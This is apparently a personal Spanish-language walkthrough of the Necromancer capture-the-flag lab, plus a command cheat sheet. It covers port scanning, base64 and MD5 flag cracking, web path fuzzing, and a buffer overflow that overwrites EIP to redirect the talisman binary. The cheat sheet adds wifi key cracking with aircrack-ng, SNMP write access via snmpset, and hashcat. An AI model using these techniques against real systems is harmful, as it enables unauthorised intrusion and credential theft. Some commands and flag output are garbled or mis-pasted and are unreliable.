>> Nota: Despues de lanzar un escaneo a todo el puerto UDP encuento que el puerto 666 está escupiendo la siguiente info
a@b:~# nmap -sU -p 666 -sV -O [IP] 

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-12-18 14:22 CET
Nmap scan report for 192.168.18.128
Host is up (0.00020s latency).
PORT    STATE SERVICE VERSION
666/udp open  doom?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-UDP:V=7.25BETA1%I=7%D=12/18%Time=5A37C146%P=x86_64-pc-linux-gnu
SF:%r(RPCCheck,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20
SF:out!\n")%r(DNSVersionBindReq,27,"You\x20gasp\x20for\x20air!\x20Time\x20
SF:is\x20running\x20out!\n")%r(DNSStatusRequest,27,"You\x20gasp\x20for\x20
SF:air!\x20Time\x20is\x20running\x20out!\n")%r(NBTStat,27,"You\x20gasp\x20
SF:for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Help,27,"You\x20gasp
SF:\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(SIPOptions,27,"Y
SF:ou\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Sqlpin
SF:g,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r
SF:(NTPRequest,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20
SF:out!\n")%r(SNMPv1public,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x2
SF:0running\x20out!\n")%r(SNMPv3GetRequest,27,"You\x20gasp\x20for\x20air!\
SF:x20Time\x20is\x20running\x20out!\n")%r(xdmcp,27,"You\x20gasp\x20for\x20
SF:air!\x20Time\x20is\x20running\x20out!\n")%r(AFSVersionRequest,27,"You\x
SF:20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(DNS-SD,27,
SF:"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Citr
SF:ix,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%
SF:r(Kerberos,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20o
SF:ut!\n")%r(sybaseanywhere,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x
SF:20running\x20out!\n");
MAC Address: 00:0C:29:B3:72:86 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.51 seconds

>>Nota: Texto limpio:

SF-Port666-UDP:
V=7.25BETA1%I=7%D=12/18%Time=5A37C146%P=x86_64-pc-linux-gnu
(RPCCheck,27,"You gasp for air! Time is running out!")
(DNSVersionBindReq,27,"You gasp for air! Time is running out!")
(DNSStatusRequest,27,"You gasp for air! Time is running out!")
(NBTStat,27,"You gasp for air! Time is running out!")
(Help,27,"You gasp for air! Time is running out!")
(SIPOptions,27,"You gasp for air! Time is running out!")
(Sqlping,27,"You gasp for air! Time is running out!")
(NTPRequest,27,"You gasp for air! Time is running out!")
(SNMPv1public,27,"You gasp for air! Time is\x20running out!")
(SNMPv3GetRequest,27,"You gasp for air! Time is running out!")
(xdmcp,27,"You gasp for air! Time is running out!")
(AFSVersionRequest,27,"You\x20gasp for air! Time is running out!")
(DNS-SD,27,"You gasp for air! Time is running out!")
(Citrix,27,"You gasp for air! Time is running out!")
(Kerberos,27,"You gasp for air! Time is running out!")
(sybaseanywhere,27,"You gasp for air! Time is running out!");

>> Nota: No se que hacer con esta información encontrada. A través de wireshark encuentro conexiones entrantes filtrando las peticiones
tcp
>> Nota: Poner a la escucha con netcat en el puero 444, esperará a que exista una comunicación.

a@b:~# nc -lvp 4444

>> Nota: La máquina al cabo del tiempo consigue captar el siguiente mensaje:

istening on [any] 4444 ...
192.168.18.128: inverse host lookup failed: Unknown host
connect to [192.168.18.129] from (UNKNOWN) [192.168.18.128] 24390
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...

>> Nota:Que en base64 significa:
Welcome!
You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.
Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  
The air around you begins to get thicker, and your heart begins to beat against your chest. 
You turn to your left.. then to your right!  You are trapped!
You fumble through your pockets.. nothing!  
You look down and see you are standing in sand.  
Dropping to your knees you begin to dig frantically.
As you dig you notice the barrier extends underground!  
Frantically you keep digging and digging until your nails suddenly catch on an object.
You dig further and discover a small wooden box.  
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.
You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"


>> Nota: el MD5 de este flag: e6078b9b1aac915d11b9fd59791030bf = opensesame
>> Nota: Envío de un mensaje al puerto 666

a@b:~# nc -u 192.168.18.128 666
opensesame

A loud crack of thunder sounds as you are knocked to your feet!
Dazed, you start to feel fresh air entering your lungs.
You are free!
In front of you written in the sand are the words:
flag2{c39cd4df8f2e35d20d92c2e44de5f7c6} 1033750779
As you stand to your feet you notice that you can no longer see the flicker of light in the distance.
You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.
As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.
The birds get closer, and closer, and closer.
Staring up at the crows you can see they are in a formation.
Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.
As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.
666 is closed.

>> Nota: Otro escaneo

a@b:~# nmap -A 192.168.18.128

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-12-19 12:28 CET
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.18.128
Host is up (0.00041s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: The Chasm
MAC Address: 00:0C:29:B3:72:86 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|firewall
Running (JUST GUESSING): OpenBSD 4.X|5.X (95%), IronPort AsyncOS 7.X (85%)
OS CPE: cpe:/o:openbsd:openbsd:4.0 cpe:/o:openbsd:openbsd:5 cpe:/o:ironport:asyncos:7.5.1
Aggressive OS guesses: OpenBSD 4.0 (95%), OpenBSD 4.6 (89%), OpenBSD 4.1 - 4.3 (86%), OpenBSD 5.0 - 5.4 (86%), OpenBSD 4.3 (86%), IronPort AsyncOS 7.5.1 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.18.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.32 seconds


>> Nota: Visualizar waf en la aplicación web, por si nos sirviera de ayuda.

a@b:~# wafw00f 192.168.18.128

The site http://192.168.18.128 is behind a Imperva SecureSphere

>> Nota: Para el análisis de la imagen! Encontrará un zip dentro con un txt y el flag dentro, que nos dará la ruta de la siguiente
prueba.

a@b:~# foremost [IMAGEN.JPG]

flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm 345465869

>> Nota: Para más análisis es posible el uso de:

a@b:~# binwalk -B magicbook.jpg

>> Nota: lanzo dirbuster, no encuentro nada con un diccionario de rutas estandar. 

a@b:~# cewl — depth 0 -m 4 -w magic.txt -v http://www.d20srd.org/indexes/magicItems.htm
a@b:~# cat magic.txt | sort | uniq > magit.txt
a@b:~# cat magit.txt > tr A-Z a-z > thing.txt


>> Nota: Creación de diccionario personalizado. Descarga de palabras a traves de una web, ordenado de a a-z y se quitan los repes
Se deja en minusculas y como resultado thing.txt

>> Nota: FUZZ otra vez contra la web, coge el fichero, descarta los 404 contra la web

a@b:~# wfuzz -c -z file,thing.txt — hc 404 http://192.168.56.102 /amagicbridgeappearsatthechasm/FUZZ

00692: C=200 9 L 109 W 9676 Ch “talisman”


>> Nota: talisman devuelve 200, es un binario. Analisis de binario, uso de file, strings, binwalk y gdb


a@b:~# gdb talisman
a@b:~# info functions
0x08048529  wearTalisman
0x08048a13  main
0x08048a37  chantToBreakSpell

>> Nota: No lo puedo correr con el comando run porque no tengo la arquitectura adecuada, me dice no encuentra el binario ejecutable
y me da error 127, pero mirando es basico, el binario pregunta tu responde y no ocurre nada, te pones a escribir más caracteres
y peta, un bufferoverflow, comandos importantes con python, pinta 32 carácteres A y se lo pasa al binario

a@b:~# python -c ‘print “A”*32’ | ./talisman

>> Nota: 32 caracteres A imprimidos: Pete con error SIGSEGV, que es por invasión de espacios de memoria.

a@b:~# (gdb) r
Starting program: /root/necromancer/talisman aaaaa
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it’s surface.

Do you want to wear the talisman? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Nothing happens.

Program received signal SIGSEGV, Segmentation fault.
0x08048a0e in wearTalisman ()

>> Nota: Pete con 36 caracteres A como vemos a pisado en donde da el error, 0x41414141 in ?? () 41 es caracter A, por lo que 
estamos pisando el EIP, que es el regitro de instrucción, donde se almacena la instrucción que se está ejecutando, por lo que 
podemos sobreescribir ese puntero para que apunte a donde nosotros queramos: 0x08048a37  chantToBreakSpell, esta función es la
que importa: 08048a37, se traduce a little endian addressing: Este formato es adoptado por la mayoría de procesadores Intel. Al 
igual que existen lenguajes donde la lectura y escritura puede ser izquierda-derecha o derecha-izquierda también en el mundo de 
los ordenadores puede suceder algo parecido. por lo que lo traducimos con una herramienta online:
https://www.scadacore.com/tools/programming-calculators/online-hex-converter/
y nos da algo tal que así: \x37\x8a\x04\x08, eso es igual a 08048a37, pintamos 32 A y \x37\x8a\x04\x08, y nos pega el salto
a la parte que indicamos.



a@b:~#(gdb) r 
Starting program: /root/necromancer/talisman 
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it’s surface.

Do you want to wear the talisman? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Nothing happens.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)


!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3} >>>>>>>>>blackmagic MD5 a@b:~# python findmyhash.py MD5 -h "ea50536158db50247e110a6c89fcf3d3"
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Program received signal SIGSEGV, Segmentation fault.
0xf7fb3300 in ?? () from /lib/i386-linux-gnu/libc.so.6




############## RECOPILATORIO DE MIERDA ##############

$ FILE RESEARCH $

GDB:

a@b:~# gdb BINARIO
(gdb) info functions {Muestra todas las funciones del binario}
(gdb) run {Ejecuta el binario}
(gdb) break [NOMBRE FUNCION] {Planta un punto de ruptura en la función indicada}
(gdb) jump [NOMBRE FUNCION] {Salta a la función indicada}

STRINGS

a@b:~# strings [BINARIO] {Muestra cadenas del binario con una longitud minima de 4 caracteres}

BINWALK

a@b:~# binwalk -B [FICHERO] {Información sobre el fichero, cabeceras y esas cosas}

FILE

a@b:~# file [FICHERO] {Información arquitectura de fichero}

$ FUZZING WEB $

a@b:~# wfuzz -c -z file,[DICCIONARIO.TXT] — hc 404 [URL] [/DIRECTORIO/]FUZZ {Fuzzea sustituyendo la palabra FUZZ de la URL destino con el diccionario proporcionado, quitando las respuesta 404}
a@b:~# cewl — depth 0 -m 4 -w [OUTPUT] -v [URL] {Creación de diccionario personalizado basado en una web}

$ NETWORKING $

NETCAT:

a@b:~# nc -u [IP] [PORT] {Envio de mensaje a la direccion seleccionada por UDP}
a@b:~# nc -lvp [PORT] {Escucha en puerto indicado TCP}

AIRCRACK:

a@b:~# aircrack-ng [CAP] -w [DICCIONARIO] {reventar claves wifi diccionario /usr/share/wordlists/termineter.txt}

ANALSIS CONTRA SNMP:

a@b:~# msf > use auxiliary/scanner/snmp/snmp_enum
a@b:~# snmpwalk -c “death2allrw” -v 1 172.16.26.128 {Despliega todos los OIDS SNMP, la version es la 1 y la community es death2allrw (rw lectura y escritua)}
a@b:~# snmpset -c “death2allrw” -v 1 172.16.26.128 [OID] s ["STRING"] {setador de OIDS}

https://www.linux-party.com/29-internet/6038-introduccion-a-los-comandos-snmp-snmpwalk-snmpget-snmptranslate


$ DECRYPT $

a@b:~# echo "CADENA BASE64"|Base64 --decode {Decodeado de base 64}
a@b:~# hashcat -m 0 -a 0 [HASHES] [DICCIONARIO (Rockyou)] {Uso de hashcar para descifrar MD5}
a@b:~# findmyhash MD5 -h [MD5] {Es online}

$ STEGO $

a@b:~# foremost [IMAGEN.JPG] {Analiza y extrae un zip de una imagen}
a@b:~# steghide info [IMAGEN.JPG] {Analiza si existe algo dentro de la imagen}
a@b:~# exiftool [IMAGEN] {es un programa de software con el que podemos acceder y manipular los metadatos}

$ OVERFLOW $

a@b:~# python -c 'print "A"*32' | [./BINARIO] {Imprime 32 veces el caracter A y se lo pasa al binario}

$ DATA COMPRESSION $

a@b:~# bzip2 -dk [bz2] 
a@b:~# tar -xvf [tar]



